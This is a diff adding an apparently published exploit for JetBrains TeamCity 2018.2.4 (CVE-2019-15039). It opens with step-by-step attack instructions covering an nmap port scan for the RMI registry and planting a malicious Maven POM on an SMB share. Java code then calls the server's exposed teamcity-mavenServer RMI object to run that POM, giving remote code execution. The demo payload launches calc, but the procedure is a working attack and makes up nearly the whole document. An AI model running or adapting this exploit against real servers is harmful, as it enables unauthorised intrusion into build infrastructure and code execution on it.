@@ -1,0 +1,149 @@
+# Exploit Title: JetBrains TeamCity 2018.2.4 - Remote Code Execution
+# Date: 2020-01-07
+# Exploit Author: Harrison Neal
+# Vendor Homepage: https://www.jetbrains.com/
+# Software Link: https://confluence.jetbrains.com/display/TW/Previous+Releases+Downloads
+# Version: 2018.2.4 for Windows
+# CVE: CVE-2019-15039
+
+# You'll need a few .jars from a copy of TeamCity to compile and run this code
+# To compile, file path should match ${package}/${class}.java, e.g.,
+# com/whatdidibreak/teamcity_expl/Main.java
+
+# Instructions for Windows (easier case):
+
+# 1) Verify exploitability.
+#    1a) Verify the remote host is running Windows, e.g. checking for common
+#        running services and their versions.
+#    1b) Discover Java RMI services on the remote host, e.g. doing a 65k port
+#        scan using nmap and the rmi-dumpregistry script. On one port, there
+#        should be a registry with an object named teamcity-mavenServer. This
+#        object should point to a second open port that is also identified as
+#        Java RMI.
+
+# 2) Prepare the payload.
+#    2a) There needs to be an SMB share that the TeamCity software can read from
+#        and that you can write to. You might establish a share on your own
+#        system and make it accessible to anonymous users. Alternatively, if the
+#        TeamCity server is domain-joined, you might find a pre-existing share
+#        elsewhere in the domain.
+#    2b) Place a malicious POM in that share, e.g.
+
+<project>
+	<modelVersion>4.0.0</modelVersion>
+	<groupId>com.mycompany.app</groupId>
+	<artifactId>my-module</artifactId>
+	<version>1</version>
+	<build>
+		<plugins>
+			<plugin>  
+				<groupId>org.codehaus.mojo</groupId> 
+				<artifactId>exec-maven-plugin</artifactId> 
+				<version>1.1.1</version> 
+				<executions>
+					<execution>
+						<goals>
+							<goal>exec</goal> 
+						</goals>
+					</execution>
+				</executions>
+				<configuration>
+					<executable>calc</executable>
+					<arguments>
+						<argument>-testarg</argument>
+					</arguments>
+				</configuration>
+			</plugin>
+		</plugins>
+	</build>
+</project>
+
+# 3) Run this exploit.
+#    Argument #1: TeamCity host (IP or FQDN)
+#    Argument #2: Port of RMI Registry (the first open port described above)
+#    Argument #3: UNC path to the malicious POM file (e.g., \\ip\share\pom.xml)
+#    Argument #4: POM goal (e.g., exec:exec)
+
+# NOTE: It is possible to exploit this issue in other situations, e.g. if the
+# TeamCity server is running on a *nix system that allows access to some local
+# directory over NFS.
+
+ */
+package com.whatdidibreak.teamcity_expl;
+
+import java.io.File;
+import java.io.IOException;
+
+import java.net.InetSocketAddress;
+import java.net.ServerSocket;
+import java.net.Socket;
+
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.RMISocketFactory;
+
+import java.util.ArrayList;
+import java.util.List;
+
+import jetbrains.buildServer.maven.remote.MavenServer;
+import jetbrains.buildServer.maven.remote.RemoteEmbedder;
+import org.jetbrains.maven.embedder.MavenEmbedderSettings;
+import org.jetbrains.maven.embedder.MavenExecutionResult;
+
+public class Main {
+
+    public static void main(String[] args) throws Throwable {
+        String host = args[0];
+        int port = Integer.parseInt(args[1]);
+        String pomPath = args[2];
+        String goal = args[3];
+
+        // The exported object may point to a different host than what we're
+        // using to connect to the registry, which could break things, i.e.,
+        // - localhost
+        // - for a multi-homed target, an IP we can't connect to
+        // - a FQDN or hostname we can't resolve
+        // - etc.
+        // For this reason, we'll set up a socket factory that forces all
+        // connections to go to the host specified by the user, ignoring the
+        // host pointed to by the exported object.
+        OverrideHostSocketFactory sf = new OverrideHostSocketFactory(host);
+        RMISocketFactory.setSocketFactory(sf);
+
+        // The rest of the code in this method should look fairly typical for
+        // interacting with remote objects using RMI.
+        Registry r = LocateRegistry.getRegistry(host, port, sf);
+
+        MavenServer ms = (MavenServer) r.lookup("teamcity-mavenServer");
+
+        MavenEmbedderSettings mes = new MavenEmbedderSettings();
+        RemoteEmbedder re = ms.exportEmbedder(mes);
+
+        File f = new File(pomPath);
+        List ap = new ArrayList();
+        List g = new ArrayList();
+        g.add(goal);
+        MavenExecutionResult mer = re.execute(f, ap, g);
+    }
+
+    private static class OverrideHostSocketFactory extends RMISocketFactory {
+
+        private String targetHost;
+
+        public OverrideHostSocketFactory(String targetHost) {
+            this.targetHost = targetHost;
+        }
+
+        @Override
+        public Socket createSocket(String host, int port) throws IOException {
+            Socket toReturn = new Socket();
+            toReturn.connect(new InetSocketAddress(targetHost, port));
+            return toReturn;
+        }
+
+        @Override
+        public ServerSocket createServerSocket(int port) throws IOException {
+            throw new UnsupportedOperationException("Not supported yet.");
+        }
+    }
+}
